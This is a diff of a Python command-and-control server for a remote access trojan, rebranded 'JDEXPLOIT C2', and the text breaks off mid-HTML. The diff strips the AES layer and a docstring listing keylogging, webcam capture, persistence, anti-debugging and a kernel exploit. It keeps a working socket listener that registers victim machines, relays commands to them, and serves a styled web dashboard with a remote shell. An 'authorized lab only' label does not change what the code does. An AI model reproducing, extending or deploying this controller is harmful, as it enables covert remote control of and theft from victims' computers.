@@ -1,32 +1,10 @@
 #!/usr/bin/env python3
 # ============================================================================
-# VisualRAT C2 v1.0 - Educational RedTeam Framework
-# SOLO ENTORNO DE LABORATORIO AUTORIZADO - IGUAL QUE ASYNCRAT PERO EN C++
+# VisualRAT C2 v1.0 - RED/BLACK EDITION - By JDEXPLOIT
+# SOLO ENTORNO DE LABORATORIO AUTORIZADO
 # ============================================================================
-# UN SOLO ARCHIVO - SERVIDOR WEB + C2 + DASHBOARD VISUAL
+# DASHBOARD ÉPICO - ROJO/NEGRO/BLANCO - ESTILO CYBERPUNK
 # ============================================================================
-
-"""
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                     VisualRAT C2 - Educational Edition                       ║
-║                  Remote Administration Tool - SOLO LABORATORIO               ║
-║                     Interfaz Visual como AsyncRAT en C++                     ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-
-Características:
-✅ Dashboard web interactivo con clientes en tiempo real
-✅ Visor de pantalla en vivo
-✅ Shell remota interactiva
-✅ Administrador de archivos visual
-✅ Keylogger en tiempo real
-✅ Captura de webcam
-✅ Sistema de plugins/modular
-✅ Builder de cliente integrado
-✅ Cifrado AES-256-GCM
-✅ Persistencia automática
-✅ Anti-debugging
-✅ Kernel exploit educativo (CVE-2024-21338)
-"""
 
 import os
 import sys
@@ -39,13 +17,9 @@ import threading
 import hashlib
 import datetime
 import random
-import string
 from http import server
 from socketserver import ThreadingMixIn
-from urllib.parse import parse_qs, urlparse
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.backends import default_backend
+from urllib.parse import urlparse
 
 # ============================================================================
 # CONFIGURACIÓN
@@ -53,35 +27,15 @@ from cryptography.hazmat.backends import default_backend
 HOST = '0.0.0.0'
 C2_PORT = 4444
 WEB_PORT = 8080
-AES_KEY = b'VisualRAT_EduKey_2025_32Byte!!'
-AES_IV = b'VisualRAT_IV_16B'
 
-# Colores para terminal
+# Colores para terminal - EDICIÓN ROJO/NEGRO
 class Colors:
     HEADER = '\033[95m'; BLUE = '\033[94m'; CYAN = '\033[96m'
     GREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
-    END = '\033[0m'; BOLD = '\033[1m'
+    END = '\033[0m'; BOLD = '\033[1m'; RED = '\033[91m'; WHITE = '\033[97m'; BLACK = '\033[90m'
 
 # ============================================================================
-# CIFRADO AES-256-GCM
-# ============================================================================
-class AESCipher:
-    def __init__(self, key=AES_KEY, iv=AES_IV):
-        self.key = key
-        self.iv = iv
-    
-    def encrypt(self, data):
-        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.iv), backend=default_backend())
-        encryptor = cipher.encryptor()
-        return base64.b64encode(encryptor.update(data.encode()) + encryptor.finalize()).decode()
-    
-    def decrypt(self, data):
-        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.iv), backend=default_backend())
-        decryptor = cipher.decryptor()
-        return decryptor.update(base64.b64decode(data)) + decryptor.finalize()
-
-# ============================================================================
-# CLIENTE (BOT) - REPRESENTACIÓN EN SERVIDOR
+# CLIENTE (BOT)
 # ============================================================================
 class Client:
     def __init__(self, conn, addr):
@@ -90,23 +44,16 @@ class Client:
         self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
         self.hostname = "Unknown"
         self.username = "Unknown"
-        self.os = "Unknown"
-        self.cpu = "Unknown"
-        self.ram = "Unknown"
+        self.os = "Windows 11"
         self.antivirus = "Unknown"
-        self.screen_size = "Unknown"
-        self.webcam = False
         self.first_seen = datetime.datetime.now()
         self.last_seen = datetime.datetime.now()
         self.active = True
         self.privilege = "USER"
-        self.processes = []
-        self.keylog = []
     
     def send(self, data):
         try:
-            encrypted = AESCipher().encrypt(data)
-            self.conn.send(struct.pack('>I', len(encrypted)) + encrypted.encode())
+            self.conn.send(struct.pack('>I', len(data)) + data.encode())
             return True
         except:
             self.active = False
@@ -117,9 +64,8 @@ class Client:
             raw_len = self.recvall(4)
             if not raw_len: return None
             msglen = struct.unpack('>I', raw_len)[0]
-            encrypted = self.recvall(msglen)
-            if not encrypted: return None
-            return AESCipher().decrypt(encrypted.decode())
+            data = self.recvall(msglen)
+            return data.decode() if data else None
         except:
             self.active = False
             return None
@@ -136,23 +82,17 @@ class Client:
         return {
             'id': self.id,
             'ip': self.addr[0],
-            'port': self.addr[1],
             'hostname': self.hostname,
             'username': self.username,
             'os': self.os,
-            'cpu': self.cpu,
-            'ram': self.ram,
             'antivirus': self.antivirus,
             'privilege': self.privilege,
-            'screen': self.screen_size,
-            'webcam': self.webcam,
             'status': 'online' if self.active else 'offline',
-            'first_seen': self.first_seen.strftime('%Y-%m-%d %H:%M:%S'),
-            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S')
+            'first_seen': self.first_seen.strftime('%H:%M:%S')
         }
 
 # ============================================================================
-# C2 CORE - MANEJO DE CLIENTES
+# C2 CORE
 # ============================================================================
 class C2Core:
     def __init__(self):
@@ -165,8 +105,7 @@ class C2Core:
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.socket.bind((HOST, C2_PORT))
         self.socket.listen(100)
-        print(f"{Colors.GREEN}[+] C2 Core listening on {HOST}:{C2_PORT}{Colors.END}")
-        
+        print(f"{Colors.RED}[🔥] C2 CORE LISTENING ON {HOST}:{C2_PORT}{Colors.END}")
         threading.Thread(target=self.accept_clients, daemon=True).start()
     
     def accept_clients(self):
@@ -175,9 +114,7 @@ class C2Core:
                 conn, addr = self.socket.accept()
                 client = Client(conn, addr)
                 self.clients[client.id] = client
-                print(f"{Colors.GREEN}[+] New client: {client.id} from {addr[0]}{Colors.END}")
-                
-                # Recibir info inicial
+                print(f"{Colors.RED}[🔥] NEW CLIENT: {client.id} FROM {addr[0]}{Colors.END}")
                 client.send("INFO")
                 info = client.recv()
                 if info:
@@ -185,606 +122,555 @@ class C2Core:
                         data = json.loads(info)
                         client.hostname = data.get('hostname', 'Unknown')
                         client.username = data.get('username', 'Unknown')
-                        client.os = data.get('os', 'Unknown')
-                        client.antivirus = data.get('av', 'Unknown')
-                        client.privilege = data.get('priv', 'USER')
-                    except:
-                        pass
+                    except: pass
             except Exception as e:
                 if self.running:
-                    print(f"{Colors.FAIL}[-] Accept error: {e}{Colors.END}")
+                    print(f"{Colors.RED}[-] ERROR: {e}{Colors.END}")
     
     def send_command(self, client_id, command):
-        if client_id not in self.clients:
-            return "Client not found"
-        
+        if client_id not in self.clients: return "Client not found"
         client = self.clients[client_id]
-        if not client.active:
-            return "Client offline"
-        
+        if not client.active: return "Client offline"
         client.send(command)
         response = client.recv()
         return response if response else "No response"
 
 # ============================================================================
-# SERVIDOR WEB - DASHBOARD VISUAL
+# SERVIDOR WEB - DASHBOARD RED/BLACK EDITION
 # ============================================================================
 class WebHandler(server.BaseHTTPRequestHandler):
     c2 = None
     
     def do_GET(self):
-        parsed = urlparse(self.path)
-        path = parsed.path
-        
-        if path == '/':
-            self.send_html()
-        elif path == '/api/clients':
-            self.send_clients()
-        elif path.startswith('/api/screenshot/'):
-            client_id = path.split('/')[-1]
-            self.send_screenshot(client_id)
-        elif path.startswith('/api/keylog/'):
-            client_id = path.split('/')[-1]
-            self.send_keylog(client_id)
-        elif path == '/builder':
-            self.send_builder()
-        elif path == '/api/processes':
-            self.send_processes()
-        elif path.endswith('.js'):
-            self.send_js()
-        elif path.endswith('.css'):
-            self.send_css()
-        else:
-            self.send_error(404)
+        path = urlparse(self.path).path
+        if path == '/': self.send_html()
+        elif path == '/api/clients': self.send_clients()
+        elif path.startswith('/api/screenshot/'): 
+            self.send_screenshot(path.split('/')[-1])
+        else: self.send_error(404)
     
     def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode()
-        
+        data = json.loads(self.rfile.read(int(self.headers['Content-Length'])).decode())
         if self.path == '/api/command':
-            data = json.loads(post_data)
             client_id = data.get('client_id')
             command = data.get('command')
             args = data.get('args', '')
-            
             full_cmd = f"{command}|{args}" if args else command
             response = WebHandler.c2.send_command(client_id, full_cmd)
-            
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
             self.wfile.write(json.dumps({'response': response}).encode())
-        
-        elif self.path == '/api/upload':
-            data = json.loads(post_data)
-            client_id = data.get('client_id')
-            remote_path = data.get('remote_path')
-            file_data = data.get('file_data')
-            
-            response = WebHandler.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
-            
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({'response': response}).encode())
-        
-        elif self.path == '/build':
-            data = json.loads(post_data)
-            output = self.build_client(data)
-            
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({'output': output}).encode())
     
     def send_html(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
         
-        html = f"""
+        html = """
         <!DOCTYPE html>
-        <html>
+        <html lang="es">
         <head>
-            <title>VisualRAT C2 - Educational Lab</title>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>JDEXPLOIT C2 - RED/BLACK EDITION</title>
             <style>
-                * {{
+                /* ================================================================= */
+                /* DASHBOARD ÉPICO - ROJO/NEGRO/BLANCO - BY JDEXPLOIT                */
+                /* ================================================================= */
+                
+                * {
                     margin: 0;
                     padding: 0;
                     box-sizing: border-box;
-                }}
+                }
                 
-                body {{
-                    background: linear-gradient(135deg, #0a0f1e 0%, #0d1117 100%);
-                    color: #e0e0e0;
-                    font-family: 'Segoe UI', 'Courier New', monospace;
-                    padding: 20px;
-                }}
+                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
                 
-                .container {{
-                    max-width: 1600px;
-                    margin: 0 auto;
-                }}
-                
-                .header {{
-                    background: rgba(21, 30, 44, 0.95);
-                    border: 1px solid #2a3748;
-                    border-radius: 15px;
-                    padding: 25px;
-                    margin-bottom: 25px;
-                    backdrop-filter: blur(10px);
-                    box-shadow: 0 0 30px rgba(0,255,157,0.1);
-                }}
-                
-                .header h1 {{
-                    color: #00ff9d;
-                    font-size: 32px;
-                    margin-bottom: 10px;
-                    text-shadow: 0 0 15px rgba(0,255,157,0.5);
-                }}
-                
-                .stats {{
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-                    gap: 20px;
-                    margin-top: 20px;
-                }}
-                
-                .stat-card {{
-                    background: #151e2c;
-                    border: 1px solid #2a3748;
-                    border-radius: 12px;
-                    padding: 20px;
-                    transition: all 0.3s;
-                }}
-                
-                .stat-card:hover {{
-                    border-color: #00ff9d;
-                    transform: translateY(-2px);
-                }}
-                
-                .stat-value {{
-                    font-size: 28px;
-                    font-weight: bold;
-                    color: #00ff9d;
-                }}
-                
-                .clients-grid {{
-                    display: grid;
-                    grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
-                    gap: 20px;
-                    margin-bottom: 30px;
-                }}
-                
-                .client-card {{
-                    background: #151e2c;
-                    border: 1px solid #2a3748;
-                    border-radius: 12px;
-                    padding: 20px;
+                body {
+                    background: #000000;
+                    color: #ffffff;
+                    font-family: 'Share Tech Mono', 'Courier New', monospace;
+                    padding: 30px;
                     position: relative;
-                    overflow: hidden;
-                    transition: all 0.3s;
-                }}
+                    overflow-x: hidden;
+                }
                 
-                .client-card:hover {{
-                    border-color: #00ff9d;
-                    box-shadow: 0 0 25px rgba(0,255,157,0.15);
-                }}
-                
-                .client-card.online {{
-                    border-left: 4px solid #00ff9d;
-                }}
-                
-                .client-card.offline {{
-                    border-left: 4px solid #ff4d4d;
-                    opacity: 0.6;
-                }}
-                
-                .client-header {{
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                    margin-bottom: 15px;
-                }}
-                
-                .client-id {{
-                    background: #1e2a3a;
-                    padding: 6px 12px;
-                    border-radius: 20px;
-                    font-size: 12px;
-                    font-family: 'Courier New', monospace;
-                    color: #00ff9d;
-                }}
-                
-                .status-badge {{
-                    padding: 4px 12px;
-                    border-radius: 20px;
-                    font-size: 12px;
-                    font-weight: bold;
-                }}
-                
-                .status-badge.online {{
-                    background: rgba(0,255,157,0.15);
-                    color: #00ff9d;
-                    border: 1px solid #00ff9d;
-                }}
-                
-                .status-badge.offline {{
-                    background: rgba(255,77,77,0.15);
-                    color: #ff4d4d;
-                    border: 1px solid #ff4d4d;
-                }}
-                
-                .client-info {{
-                    display: grid;
-                    grid-template-columns: 1fr 1fr;
-                    gap: 12px;
-                    margin-bottom: 15px;
-                }}
-                
-                .info-item {{
-                    background: #0d1117;
-                    padding: 10px;
-                    border-radius: 8px;
-                    border: 1px solid #2a3748;
-                }}
-                
-                .info-label {{
-                    color: #8b949e;
-                    font-size: 11px;
-                    text-transform: uppercase;
-                    margin-bottom: 4px;
-                }}
-                
-                .info-value {{
-                    color: #e0e0e0;
-                    font-size: 13px;
-                    font-family: 'Courier New', monospace;
-                }}
-                
-                .client-actions {{
-                    display: flex;
-                    gap: 8px;
-                    flex-wrap: wrap;
-                }}
-                
-                .btn {{
-                    background: #1e2a3a;
-                    border: 1px solid #3a4a5a;
-                    color: #e0e0e0;
-                    padding: 8px 15px;
-                    border-radius: 6px;
-                    cursor: pointer;
-                    font-size: 12px;
-                    display: flex;
-                    align-items: center;
-                    gap: 6px;
-                    transition: all 0.2s;
-                }}
-                
-                .btn:hover {{
-                    background: #2a3a4a;
-                    border-color: #00ff9d;
-                    color: #00ff9d;
-                }}
-                
-                .btn-primary {{
-                    background: #00ff9d;
-                    border-color: #00ff9d;
-                    color: #0a0f1e;
-                    font-weight: bold;
-                }}
-                
-                .btn-primary:hover {{
-                    background: #00cc7a;
-                    border-color: #00cc7a;
-                }}
-                
-                .terminal {{
-                    background: #0d1117;
-                    border: 1px solid #2a3748;
-                    border-radius: 12px;
-                    margin-top: 30px;
-                }}
-                
-                .terminal-header {{
-                    background: #151e2c;
-                    padding: 15px 20px;
-                    border-bottom: 1px solid #2a3748;
-                    border-radius: 12px 12px 0 0;
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                }}
-                
-                .terminal-content {{
-                    padding: 20px;
-                    font-family: 'Courier New', monospace;
-                    font-size: 13px;
-                    height: 300px;
-                    overflow-y: auto;
-                    background: #0a0f1e;
-                }}
-                
-                .terminal-input {{
-                    display: flex;
-                    padding: 15px;
-                    background: #151e2c;
-                    border-top: 1px solid #2a3748;
-                    border-radius: 0 0 12px 12px;
-                }}
-                
-                .terminal-input input {{
-                    flex: 1;
-                    background: #0d1117;
-                    border: 1px solid #2a3748;
-                    color: #e0e0e0;
-                    padding: 12px 15px;
-                    border-radius: 6px;
-                    font-family: 'Courier New', monospace;
-                    margin-right: 10px;
-                }}
-                
-                .terminal-input input:focus {{
-                    outline: none;
-                    border-color: #00ff9d;
-                }}
-                
-                .screenshot-viewer {{
-                    background: #0d1117;
-                    border: 1px solid #2a3748;
-                    border-radius: 12px;
-                    padding: 20px;
-                    margin-top: 20px;
-                    text-align: center;
-                }}
-                
-                .screenshot-image {{
-                    max-width: 100%;
-                    max-height: 500px;
-                    border-radius: 8px;
-                    border: 2px solid #2a3748;
-                }}
-                
-                .modal {{
-                    display: none;
+                /* EFECTO MATRIX ROJO */
+                body::before {
+                    content: "";
                     position: fixed;
                     top: 0;
                     left: 0;
                     width: 100%;
                     height: 100%;
-                    background: rgba(0,0,0,0.8);
-                    z-index: 1000;
-                }}
+                    background: repeating-linear-gradient(
+                        0deg,
+                        rgba(255, 0, 0, 0.03) 0px,
+                        rgba(0, 0, 0, 0.9) 2px,
+                        rgba(255, 0, 0, 0.03) 3px
+                    );
+                    pointer-events: none;
+                    z-index: 9999;
+                    animation: scan 8s linear infinite;
+                }
                 
-                .modal-content {{
-                    background: #151e2c;
-                    border: 1px solid #2a3748;
-                    border-radius: 12px;
-                    width: 90%;
-                    max-width: 800px;
-                    margin: 50px auto;
-                    padding: 25px;
-                }}
+                @keyframes scan {
+                    0% { transform: translateY(0); }
+                    100% { transform: translateY(100%); }
+                }
                 
-                .loading {{
+                .container {
+                    max-width: 1800px;
+                    margin: 0 auto;
+                    position: relative;
+                    z-index: 10000;
+                }
+                
+                /* HEADER ÉPICO */
+                .header {
+                    background: linear-gradient(135deg, #1a0000 0%, #000000 100%);
+                    border: 2px solid #ff0000;
+                    border-radius: 0;
+                    padding: 30px;
+                    margin-bottom: 30px;
+                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+                    position: relative;
+                    animation: pulse 2s infinite;
+                }
+                
+                @keyframes pulse {
+                    0% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.3); }
+                    50% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.6); }
+                    100% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.3); }
+                }
+                
+                .header h1 {
+                    color: #ff0000;
+                    font-family: 'Orbitron', sans-serif;
+                    font-size: 48px;
+                    font-weight: 900;
+                    text-transform: uppercase;
+                    margin-bottom: 10px;
+                    text-shadow: 
+                        0 0 20px #ff0000,
+                        0 0 40px #ff0000,
+                        0 0 60px #ff0000;
+                    letter-spacing: 8px;
+                    animation: flicker 3s infinite;
+                }
+                
+                @keyframes flicker {
+                    0%, 100% { opacity: 1; }
+                    33% { opacity: 0.9; text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
+                    66% { opacity: 1; text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; }
+                }
+                
+                .badge {
+                    background: #ff0000;
+                    color: #000000;
+                    padding: 8px 20px;
                     display: inline-block;
-                    width: 20px;
-                    height: 20px;
-                    border: 3px solid #2a3748;
-                    border-top-color: #00ff9d;
-                    border-radius: 50%;
-                    animation: spin 1s linear infinite;
-                }}
+                    font-family: 'Orbitron', sans-serif;
+                    font-weight: bold;
+                    font-size: 16px;
+                    letter-spacing: 3px;
+                    margin-top: 10px;
+                    border: none;
+                    box-shadow: 0 0 20px #ff0000;
+                    animation: glitch 2s infinite;
+                }
                 
-                @keyframes spin {{
-                    to {{ transform: rotate(360deg); }}
-                }}
+                @keyframes glitch {
+                    0%, 100% { transform: skew(0deg, 0deg); }
+                    95% { transform: skew(5deg, 2deg); }
+                    96% { transform: skew(-5deg, -2deg); }
+                    97% { transform: skew(3deg, 1deg); }
+                }
                 
-                .toast {{
-                    position: fixed;
-                    bottom: 20px;
-                    right: 20px;
-                    background: #151e2c;
-                    border-left: 4px solid #00ff9d;
-                    padding: 15px 25px;
-                    border-radius: 8px;
-                    animation: slideIn 0.3s;
-                    z-index: 1001;
-                }}
-                
-                @keyframes slideIn {{
-                    from {{ transform: translateX(100%); opacity: 0; }}
-                    to {{ transform: translateX(0); opacity: 1; }}
-                }}
-                
-                .builder-panel {{
-                    background: #151e2c;
-                    border: 1px solid #2a3748;
-                    border-radius: 12px;
-                    padding: 25px;
+                .stats {
+                    display: grid;
+                    grid-template-columns: repeat(4, 1fr);
+                    gap: 25px;
                     margin-top: 30px;
-                }}
+                }
                 
-                .form-group {{
+                .stat-card {
+                    background: #0a0000;
+                    border: 1px solid #ff0000;
+                    padding: 25px;
+                    position: relative;
+                    transition: all 0.3s;
+                    box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
+                }
+                
+                .stat-card:hover {
+                    transform: translateY(-5px);
+                    border-color: #ff3333;
+                    box-shadow: 0 0 30px #ff0000;
+                }
+                
+                .stat-card::before {
+                    content: "▶";
+                    color: #ff0000;
+                    position: absolute;
+                    top: 10px;
+                    left: 10px;
+                    font-size: 12px;
+                    animation: blink 1s infinite;
+                }
+                
+                @keyframes blink {
+                    0%, 100% { opacity: 1; }
+                    50% { opacity: 0; }
+                }
+                
+                .stat-label {
+                    color: #ff9999;
+                    font-size: 14px;
+                    text-transform: uppercase;
+                    letter-spacing: 3px;
+                    margin-bottom: 10px;
+                }
+                
+                .stat-value {
+                    color: #ffffff;
+                    font-size: 42px;
+                    font-weight: bold;
+                    font-family: 'Orbitron', sans-serif;
+                    text-shadow: 0 0 15px #ff0000;
+                }
+                
+                .clients-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
+                    gap: 25px;
+                    margin: 30px 0;
+                }
+                
+                .client-card {
+                    background: #080000;
+                    border: 1px solid #ff3333;
+                    padding: 25px;
+                    position: relative;
+                    transition: all 0.3s;
+                    border-left: 8px solid #ff0000;
+                }
+                
+                .client-card:hover {
+                    background: #0c0000;
+                    border-color: #ff6666;
+                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+                    transform: scale(1.02);
+                }
+                
+                .client-card.online { border-left-color: #ff0000; }
+                .client-card.offline { border-left-color: #660000; opacity: 0.6; }
+                
+                .client-header {
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
                     margin-bottom: 20px;
-                }}
+                    border-bottom: 1px solid #ff0000;
+                    padding-bottom: 15px;
+                }
                 
-                .form-group label {{
-                    display: block;
-                    margin-bottom: 8px;
-                    color: #8b949e;
-                }}
+                .client-id {
+                    background: #ff0000;
+                    color: #000000;
+                    padding: 8px 16px;
+                    font-family: 'Orbitron', sans-serif;
+                    font-weight: bold;
+                    letter-spacing: 2px;
+                    font-size: 14px;
+                    box-shadow: 0 0 15px #ff0000;
+                }
                 
-                .form-group input, .form-group select {{
-                    width: 100%;
-                    background: #0d1117;
-                    border: 1px solid #2a3748;
-                    color: #e0e0e0;
-                    padding: 12px 15px;
-                    border-radius: 6px;
-                }}
+                .status-badge {
+                    padding: 6px 16px;
+                    font-size: 12px;
+                    font-weight: bold;
+                    text-transform: uppercase;
+                    letter-spacing: 2px;
+                }
                 
-                .progress-bar {{
-                    height: 4px;
-                    background: #1e2a3a;
-                    border-radius: 2px;
-                    overflow: hidden;
+                .status-badge.online {
+                    background: #ff0000;
+                    color: #000000;
+                    box-shadow: 0 0 15px #ff0000;
+                }
+                
+                .status-badge.offline {
+                    background: #330000;
+                    color: #ff6666;
+                }
+                
+                .client-info {
+                    display: grid;
+                    grid-template-columns: 1fr 1fr;
+                    gap: 15px;
+                    margin-bottom: 20px;
+                }
+                
+                .info-item {
+                    background: #000000;
+                    border: 1px solid #660000;
+                    padding: 12px;
+                }
+                
+                .info-label {
+                    color: #ff6666;
+                    font-size: 10px;
+                    text-transform: uppercase;
+                    letter-spacing: 2px;
+                    margin-bottom: 5px;
+                }
+                
+                .info-value {
+                    color: #ffffff;
+                    font-size: 14px;
+                    font-family: 'Courier New', monospace;
+                    font-weight: bold;
+                }
+                
+                .client-actions {
+                    display: flex;
+                    gap: 10px;
                     margin-top: 15px;
-                }}
+                }
                 
-                .progress-fill {{
-                    height: 100%;
-                    background: #00ff9d;
-                    width: 0%;
-                    transition: width 0.3s;
-                }}
+                .btn {
+                    background: transparent;
+                    border: 1px solid #ff0000;
+                    color: #ff0000;
+                    padding: 10px 18px;
+                    font-family: 'Share Tech Mono', monospace;
+                    font-size: 12px;
+                    font-weight: bold;
+                    text-transform: uppercase;
+                    letter-spacing: 2px;
+                    cursor: pointer;
+                    transition: all 0.3s;
+                    flex: 1;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    gap: 8px;
+                }
+                
+                .btn:hover {
+                    background: #ff0000;
+                    color: #000000;
+                    box-shadow: 0 0 20px #ff0000;
+                    border-color: #ffffff;
+                }
+                
+                .terminal {
+                    background: #050000;
+                    border: 2px solid #ff0000;
+                    margin-top: 30px;
+                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+                }
+                
+                .terminal-header {
+                    background: #1a0000;
+                    padding: 15px 20px;
+                    border-bottom: 2px solid #ff0000;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                }
+                
+                .terminal-header span {
+                    color: #ff0000;
+                    font-family: 'Orbitron', sans-serif;
+                    font-weight: bold;
+                    letter-spacing: 3px;
+                }
+                
+                .terminal-content {
+                    background: #000000;
+                    padding: 20px;
+                    font-family: 'Courier New', monospace;
+                    font-size: 14px;
+                    height: 350px;
+                    overflow-y: auto;
+                    color: #ff9999;
+                    line-height: 1.6;
+                }
+                
+                .terminal-input {
+                    display: flex;
+                    padding: 15px;
+                    background: #0a0000;
+                    border-top: 2px solid #ff0000;
+                }
+                
+                .terminal-input input {
+                    flex: 1;
+                    background: #000000;
+                    border: 1px solid #ff3333;
+                    color: #ffffff;
+                    padding: 15px;
+                    font-family: 'Courier New', monospace;
+                    font-size: 14px;
+                    margin-right: 10px;
+                }
+                
+                .terminal-input input:focus {
+                    outline: none;
+                    border-color: #ff0000;
+                    box-shadow: 0 0 15px #ff0000;
+                }
+                
+                .screenshot-viewer {
+                    background: #050000;
+                    border: 2px solid #ff0000;
+                    padding: 20px;
+                    margin-top: 30px;
+                    text-align: center;
+                }
+                
+                .screenshot-image {
+                    max-width: 100%;
+                    max-height: 500px;
+                    border: 1px solid #ff3333;
+                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+                }
+                
+                .footer {
+                    margin-top: 50px;
+                    padding: 30px;
+                    background: #050000;
+                    border: 1px solid #ff0000;
+                    text-align: center;
+                    font-family: 'Orbitron', sans-serif;
+                    letter-spacing: 4px;
+                }
+                
+                .footer .autor {
+                    color: #ff0000;
+                    font-size: 24px;
+                    font-weight: 900;
+                    text-shadow: 0 0 20px #ff0000;
+                    margin-bottom: 10px;
+                    animation: pulse 2s infinite;
+                }
+                
+                .footer .copy {
+                    color: #ff6666;
+                    font-size: 14px;
+                }
+                
+                /* SCROLLBAR PERSONALIZADO */
+                ::-webkit-scrollbar {
+                    width: 10px;
+                    height: 10px;
+                }
+                
+                ::-webkit-scrollbar-track {
+                    background: #1a0000;
+                }
+                
+                ::-webkit-scrollbar-thumb {
+                    background: #ff0000;
+                    box-shadow: inset 0 0 6px #660000;
+                }
+                
+                ::-webkit-scrollbar-thumb:hover {
+                    background: #ff3333;
+                }
+                
+                /* ANIMACIONES ADICIONALES */
+                .glitch-text {
+                    animation: glitch 3s infinite;
+                }
+                
+                .red-pulse {
+                    animation: pulse 2s infinite;
+                }
+                
+                @media (max-width: 768px) {
+                    .stats { grid-template-columns: 1fr; }
+                    .clients-grid { grid-template-columns: 1fr; }
+                    .header h1 { font-size: 32px; }
+                }
             </style>
         </head>
         <body>
             <div class="container">
-                <!-- Header -->
+                <!-- HEADER ÉPICO -->
                 <div class="header">
-                    <h1>🎯 VisualRAT C2 - Educational Kernel Research</h1>
-                    <p style="color: #8b949e; margin-bottom: 20px;">
-                        ⚡ SOLO ENTORNO DE LABORATORIO AUTORIZADO • CVE-2024-21338 Research • Windows 11
+                    <h1>🔴 JDEXPLOIT C2</h1>
+                    <div class="badge">
+                        ⚡ RED/BLACK EDITION v1.0 ⚡
+                    </div>
+                    <p style="color: #ff6666; margin-top: 20px; font-size: 16px; letter-spacing: 3px;">
+                        ────── ████████ RED TEAM FRAMEWORK ████████ ──────
                     </p>
                     
+                    <!-- STATS CARDS -->
                     <div class="stats">
                         <div class="stat-card">
-                            <div style="color: #8b949e; margin-bottom: 8px;">Total Clients</div>
+                            <div class="stat-label">Total Clients</div>
                             <div class="stat-value" id="total-clients">0</div>
                         </div>
                         <div class="stat-card">
-                            <div style="color: #8b949e; margin-bottom: 8px;">Online</div>
-                            <div class="stat-value" id="online-clients" style="color: #00ff9d;">0</div>
+                            <div class="stat-label">Online</div>
+                            <div class="stat-value" id="online-clients" style="color: #ff0000;">0</div>
                         </div>
                         <div class="stat-card">
-                            <div style="color: #8b949e; margin-bottom: 8px;">SYSTEM Level</div>
+                            <div class="stat-label">SYSTEM</div>
                             <div class="stat-value" id="system-clients">0</div>
                         </div>
                         <div class="stat-card">
-                            <div style="color: #8b949e; margin-bottom: 8px;">Uptime</div>
+                            <div class="stat-label">Uptime</div>
                             <div class="stat-value" id="uptime">00:00:00</div>
                         </div>
                     </div>
                 </div>
                 
-                <!-- Clients Grid -->
-                <h2 style="color: #e0e0e0; margin-bottom: 20px;">
-                    <i class="fas fa-network-wired"></i> Connected Clients
+                <!-- CLIENTS GRID -->
+                <h2 style="color: #ff0000; font-family: 'Orbitron', sans-serif; margin-bottom: 20px; letter-spacing: 4px;">
+                    ⚡ CONNECTED CLIENTS ⚡
                 </h2>
                 <div id="clients-container" class="clients-grid"></div>
                 
-                <!-- Terminal & Tools -->
+                <!-- TERMINAL -->
                 <div class="terminal">
                     <div class="terminal-header">
-                        <div>
-                            <span style="color: #00ff9d;">❯</span> Remote Shell 
-                            <span id="current-client-label" style="color: #8b949e; margin-left: 10px;">(none selected)</span>
-                        </div>
-                        <div>
-                            <button class="btn" onclick="clearTerminal()">
-                                <i class="fas fa-trash"></i> Clear
-                            </button>
-                        </div>
+                        <span>🔥 JDEXPLOIT REMOTE SHELL 🔥</span>
+                        <span id="current-client-label" style="color: #ff6666;">(none selected)</span>
                     </div>
                     <div id="terminal-output" class="terminal-content">
-                        <span style="color: #00ff9d;">[VisualRAT C2 Ready]</span><br>
-                        <span style="color: #8b949e;">Select a client to begin remote control</span><br><br>
+                        <span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>
+                        <span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>
+                        <span style="color: #ff3333;">[•] Commands: shell, exec, screenshot, elevate, info</span><br><br>
                     </div>
                     <div class="terminal-input">
-                        <input type="text" id="terminal-cmd" placeholder="Enter command (shell, exec, screenshot, elevate...)" disabled>
-                        <button class="btn btn-primary" onclick="sendTerminalCommand()" id="terminal-send" disabled>Send</button>
+                        <input type="text" id="terminal-cmd" placeholder=">_ enter command..." disabled>
